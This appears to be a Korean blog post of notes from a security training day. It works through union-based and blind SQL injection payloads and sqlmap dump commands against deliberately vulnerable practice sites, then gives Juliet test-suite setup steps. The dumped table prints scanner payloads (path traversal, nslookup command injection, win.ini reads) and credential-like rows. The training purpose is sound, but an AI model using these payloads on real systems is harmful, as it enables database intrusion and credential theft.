@@ -1,0 +1,397 @@
+---
+title: "보안교육 1일차"
+date: 2015-09-07 16:55:00 +0900
+categories: [경험 및 정보 공유]
+original_url: "https://blog.naver.com/kkforgg/220474374362"
+---
+
+**mySQL 기반 해킹 하는 방법.**
+
+SQL Injection - union 기반으로 해킹하기.
+
+**먼저 컬럼 갯수를 파악한다.
+
+null 값으로 입력하여 알아낸다.
+
+페이지 하단에 컬럼 숫자들이 노출된다. 따라서 그걸 이용해서 원하는 값을 조회한다.
+
+<http://testphp.vulnweb.com/listproducts.php?cat=1> union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11#
+
+<http://testphp.vulnweb.com/listproducts.php?cat=1> union all select 1, user(), 3, 4, 5, 6, 7, 8, 9, 10, 11#
+
+계정정보
+
+[acuart@localhost](mailto:acuart@localhost)
+
+table 정보 알아내기
+
+<http://testphp.vulnweb.com/listproducts.php?cat=1> union all select 1, group_concat(table_name), 3, 4, 5, 6, 7, 8, 9, 10, 11 from information_schema.tables where table_schema=database()#
+
+table list
+
+artists,carts,categ,featured,guestbook,pictures,products,users
+
+계정 정보는 users 테이블 안에 존재할 것으로 판단
+
+따라서 user table을 검색
+
+<http://testphp.vulnweb.com/listproducts.php?cat=1> union all select 1, group_concat(column_name), 3, 4, 5, 6, 7, 8, 9, 10, 11 from information_schema.columns where table_name = 'users'#
+
+노출된 컬럼들
+
+uname,pass,cc,address,email,name,phone,cart
+
+사용자 정보는 uname, pass 에 유저 아이디와 password가 들어있을 것이다.
+
+# id 추출
+
+<http://testphp.vulnweb.com/listproducts.php?cat=1> union all select 1, uname , 3, 4, 5, 6, 7, 8, 9, 10, 11 from users#
+
+# pw 추출
+<http://testphp.vulnweb.com/listproducts.php?cat=1> union all select 1, pass , 3, 4, 5, 6, 7, 8, 9, 10, 11 from users#
+
+test / test 나온다
+
+노출된 정보로 좌측 메뉴 중 sign up을 눌러서 로그인이 되는지 확인한다.
+
+-----------------------------------------------------------------
+
+SQL Injection - Blind 기반으로 해킹하기.**
+
+<http://localhost:8080/WebGoat/attack>
+
+WebGoat 를 실행 후 guest/ guest 를 입력하여 로그인한다.
+
+**4번 폴더 밑에 injection flaws 부분 클릭한다.
+
+Blind String SQL Injection 을 선택한다.
+
+owasp 에서 만들고 배포해주는 WebGoat 를 이용하여 진행한다.
+
+패스워드를 ascii 코드 표를 이용하여 대/소문자 범위를 검색 한 뒤
+
+아래의 메시지를 통해 범위가 맞는지 안맞는지 확인 후 진행.
+
+input tag 내에 조건절 입력.
+
+account number is valid => 이게 답.
+
+Invalid account number -> 틀린 답.
+
+101 AND (select ASCII(SUBSTR(name, 1,1)) FROM pins WHERE cc_number = 4321432143214321) > 65
+
+1번째
+
+101 AND (select ASCII(SUBSTR(name, 1,1)) FROM pins WHERE cc_number = 4321432143214321) = 74
+
+J
+
+2번째
+
+101 AND (select ASCII(SUBSTR(name, 2,1)) FROM pins WHERE cc_number = 4321432143214321)  = 105
+
+i
+
+3번째
+
+101 AND (select ASCII(SUBSTR(name, 3,1)) FROM pins WHERE cc_number = 4321432143214321)  = 108
+
+l
+
+4번째
+
+101 AND (select ASCII(SUBSTR(name, 4,1)) FROM pins WHERE cc_number = 4321432143214321)  = 108
+
+l
+
+정답임
+
+------------------------------------------------------------------
+
+SQL injection - 자동실습**
+
+**PC에 python 2.7 버전을 설치해 둔다.
+
+그리고 07번째 폴더 안에 있는 sql map을 압축을 풀고
+
+sqlmap.py를 이용하여 자동화로 하는 법을 알아본다.
+
+window cmd 로 압축푼 폴더로 이동 후
+
+python sqlmap.py -h 를 입력한다.
+
+여기서 help 메시지가 나타나면 정상이다.
+
+취약점 점검할 페이지 정보
+
+python sqlmap.py -u testasp.vulnweb.com/showforum.asp?id=2
+
+실행하면 y,n을 묻는데 y로 하고 진행한다.
+
+C:\Users\user\.sqlmap\output\testasp.vulnweb.com
+
+사용자 계정 정보를 확인하기 위한 테스트
+
+python sqlmap.py -u testasp.vulnweb.com/showforum.asp?id=2 --batch --current-user
+
+해당 명령어 실행하면 current user 정보가 나온다.
+
+데이터 베이스 정보를 끌어오기 위한 테스트
+
+python sqlmap.py -u testasp.vulnweb.com/showforum.asp?id=2 --batch --dbs
+
+7개의 database 정보가 노출된다.
+
+[*] acublog
+[*] acuforum
+[*] acuservice
+[*] master
+[*] model
+[*] msdb
+[*] tempdb
+
+이중에서 database 계정 1개를 선택하여 table을 알아 낸다.
+
+python sqlmap.py -u testasp.vulnweb.com/showforum.asp?id=2 --tables -D acuforum --batch
+
+Database: acuforum
+[4 tables]
++---------+
+| forums  |
+| posts   |
+| threads |
+| users   |
++---------+
+
+해당 테이블 중 users 테이블에 있는 정보를 가져온
+
+python sqlmap.py -u testasp.vulnweb.com/showforum.asp?id=2 --dump -T dbo.users -D acuforum --batch
+
+| kscjgyjc&n935977=v910733     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | kscjgyjc
+           |
+| ktkerlsv                     | g00dPa$$w0rD_984362          | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | ktkerlsv
+           |
+| lbmnvvxk                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | lbmnvvxk
+           |
+| lhppqyqu                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | yfqremmc_90159
+8          |
+| lhppqyqu_919686              | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | batanads
+           |
+| linkdbappsecurity2           | 1                            | [abc123@mycom.com](mailto:abc123@mycom.com)
+                                                      | <blank> | 1
+           |
+| lysyoyrj                     | g00dPa$$w0rD                 | ../../../../../.
+./../../../../windows/win.ini                         | <blank> | lysyoyrj
+           |
+| ME5TT053SkY=                 | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | pkebichv
+           |
+| mhtmldbappsecurity2          | 1                            | [abc123@mycom.com](mailto:abc123@mycom.com)
+                                                      | <blank> | 1
+           |
+| Michaelkar                   | 3nwP6vrv8E                   | [johndunin74@gmai](mailto:johndunin74@gmai)
+l.com                                                 | <blank> | Michaelkar
+           |
+| mlvdyfnd                     | g00dPa$$w0rD                 | [www.acunetix.com](http://www.acunetix.com)
+                                                      | <blank> | mlvdyfnd
+           |
+| mnnuebdb                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | mnnuebdb
+           |
+| multidbappsecurity2          | 1                            | [abc123@mycom.com](mailto:abc123@mycom.com)
+                                                      | <blank> | 1
+           |
+| ncedkcno                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | ncedkcno
+           |
+| nibojrwo                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | nibojrwo
+           |
+| njcqmqya                     | g00dPa$$w0rD                 | \r\n SomeCustomI
+njectedHeader:injected_by_wvs                         | <blank> | njcqmqya
+           |
+| njstslws                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | njstslws
+           |
+| nmknrpgy                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | nmknrpgy
+           |
+| nujbaemv                     | g00dPa$$w0rD                 | response.write(9
+155122*9194598)                                       | <blank> | nujbaemv
+           |
+| nvfgpqqy                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | nvfgpqqy&n9574
+97=v963665 |
+| oldgyaxu                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | oldgyaxu
+           |
+| pbysmigo                     | g00dPa$$w0rD                 | <blank>
+                                                      | <blank> | pbysmigo
+           |
+| pkebichv                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | T1RKbjkycXA=
+           |
+| print `nslookup 0Wv1gWlO`    | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | ncedkcno
+           |
+| print `nslookup rOgnJIRB`    | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | ncedkcno
+           |
+| print `nslookup vy47Ga5C`    | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | ncedkcno
+           |
+| print `nslookup wx9h4lKv`    | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | cravorpm
+           |
+| print 8-9999108099999;       | 1                            | [abc123@mycom.com](mailto:abc123@mycom.com)
+                                                      | <blank> | 1
+           |
+| print 8-9999108099999;#      | 1                            | [abc123@mycom.com](mailto:abc123@mycom.com)
+                                                      | <blank> | 1
+           |
+| pubxentk                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+&n960920=v912388                                      | <blank> | pubxentk
+           |
+| qfmidmrb                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | nvyxpkpr
+           |
+| qkwsttjb                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+&n987761=v976851                                      | <blank> | qkwsttjb
+           |
+| qodpqqtf                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | qodpqqtf
+           |
+| qrfetorb                     | g00dPa$$w0rD                 | ))))))))))))))))
+))))))))))))))))))))))))))))))))))))))))))))))))))))) | <blank> | qrfetorb
+           |
+| raanu                        | 3383                         | [raibin@hotmail.c](mailto:raibin@hotmail.c)
+om                                                    | <blank> | raibin
+           |
+| rawbite                      | none                         | lala
+                                                      | <blank> | lala
+           |
+| rbhsksiy                     | g00dPa$$w0rD                 | ../../../../../.
+./../../../../windows/win.ini                         | <blank> | rbhsksiy
+           |
+| register.asp                 | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | iquaddme
+           |
+| register.asp/.               | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | iquaddme
+           |
+| renkqujy                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | renkqujy
+           |
+| rlmxftnd                     | g00dPa$$w0rD                 | ${10000226+10000
+249}                                                  | <blank> | rlmxftnd
+           |
+| RobertLecy                   | wg7qoS85qY                   | [queenielee1964@g](mailto:queenielee1964@g)
+mail.com                                              | <blank> | RobertLecy
+           |
+| RobertOr                     | P5o9uc7ezX                   | icustomerservice
+[you@gmail.com](mailto:you@gmail.com)                                         | <blank> | RobertOr
+           |
+| rrahul206                    | iamafake                     | [rrahul206@gmail](mailto:rrahul206@gmail).
+com                                                   | <blank> | Rahul R
+           |
+| rrgsoqil&n996249=v950650     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | rrgsoqil
+           |
+| set|set&set                  | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | ncedkcno
+           |
+| shfaephw&n942036=v972013     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | shfaephw
+           |
+| sree                         | abcd                         | sreeharim
+                                                      | <blank> | sreehari
+           |
+| swxomgiw                     | g00dPa$$w0rD&n999315=v902220 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | swxomgiw
+           |
+| t2IjnO6G                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | nibojrwo
+           |
+| tbtjrjth                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | tbtjrjth
+           |
+| toubcxmq                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | toubcxmq
+           |
+| tpcwacdq                     | g00dPa$$w0rD                 | ;print(md5(acune
+tix_wvs_security_test));                              | <blank> | tpcwacdq
+           |
+| TwW6wMCj                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | xqjdvtdv
+           |
+| TXRUMzd4aVY=                 | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | uhxoygny
+           |
+| type c:\\windows\\win.ini    | 1                            | [abc123@mycom.com](mailto:abc123@mycom.com)
+                                                      | <blank> | 1
+           |
+| U01I98as                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | ilpfiohh
+           |
+| uegiejcs                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | yohrnthf_90577
+9          |
+| uegiejcs_947484              | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | mgjyeaga
+           |
+| uhimkigl                     | g00dPa$$w0rD                 | <!--
+                                                      | <blank> | uhimkigl
+           |
+| uhxoygny                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | THhuWHh4ZWM=
+           |
+| utf7dbappsecurity2           | 1                            | [abc123@mycom.com](mailto:abc123@mycom.com)
+                                                      | <blank> | 1
+           |
+| V3BKYnZUa0s=                 | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | xqfcxkkq
+           |
+| veprfaru                     | g00dPa$$w0rD                 | [sample@email.tst](mailto:sample@email.tst)
+                                                      | <blank> | veprfaru
+           |
+
+dlfjgrp skdhsek.
+
+---------------------- 시큐어 코딩 점검 도구 기준 ------------------------------------
+
+nist juliet  (juliet 코드라고 한다)**
+
+python
+ant
+jdk
+
+위의 3가지가 필요하다.
+
+각각 설치 후 환경변수 path 내에 선언해준다.
+
+cafe.naver.com/sec
+
+유틸리티 들어가서
+
+자바 취약소스 리스트 다운로드
+
+암호 1234567
+
+tmp(2) 폴더 쪽을 압축을 푼뒤
+
+python test.py 실행한다.
+
+bulid가 완료되면
+
+C:\Users\user\Desktop\tmp (2)\src\testcases
+
+로 이동하여 소스들을 확인 할 수 있다.
+
+------------------------ sql injection 실습 -----------------------------------------------
+
+명령어 결정 : 윈도우 / 유닉스
